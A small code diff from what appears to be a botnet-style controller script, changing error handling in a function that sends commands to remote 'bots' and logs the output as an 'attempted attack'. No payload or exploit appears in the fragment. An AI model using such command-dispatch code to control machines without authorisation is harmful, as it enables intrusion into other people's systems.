@@ -14,5 +14,5 @@ def command_bot(command, bot):
         attack = bot.send_command(command) # Store attack
         print('Output from '+bot.host) # Log output
         print(attack) # Log attempted attack
-    except Exception as e:
-        print(e)
+    except Exception:
+        print('bot with host '+bot.host+' offline')        
